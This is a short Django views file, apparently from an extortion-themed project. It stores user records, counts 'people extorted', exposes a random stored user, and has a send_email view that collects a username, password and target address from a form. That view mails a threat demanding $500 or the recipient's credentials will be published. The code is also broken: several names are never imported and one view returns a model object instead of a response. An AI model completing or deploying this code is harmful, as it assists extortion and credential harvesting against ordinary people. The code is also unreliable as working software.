from django.shortcuts import render
from main.models import smuck
from django.http import JsonResponse 
from django.http import HttpResponse

# Create your views here.
def randomexpose(request):
    user_obj = smuck.objects.order_by('?').first()    

    return user_obj

def numexposed(request):
    user_obj = smuck.objects.latest('id').id
    return JsonResponse({"numberofpeopleextoreted":user_obj})

def create(request):

    tosave = smuck.objects.create(email='123@email.com', username='abc', password='bb')
    return JsonResponse({"result":"created"})

def giveimages(request):
    pass

def send_email(request):
    template_name='captcha.html'
    subject = "YOU'VE BEEN L33T HAXXED N00B!!"
    message = "Hello, we are elite hacker team. You system has been comprimised. If you do not to us send 500 $ dollar, we will post you credential for everyone to see."
    from_email = settings.EMAIL_HOST_USER
    username = request.POST.get('username', '')
    password = request.POST.get('password', '')
    to_email = request.POST.get('to_email', '')
    if to_email:
        try:
            send_mail(subject, message, from_email, to_email)
        except BadHeaderError:
            return HttpResponse('Invalid header found.')
        return HttpResponseRedirect('/main/confirm')
    else:
        return HttpResponse('Make sure all fields are entered and valid.')
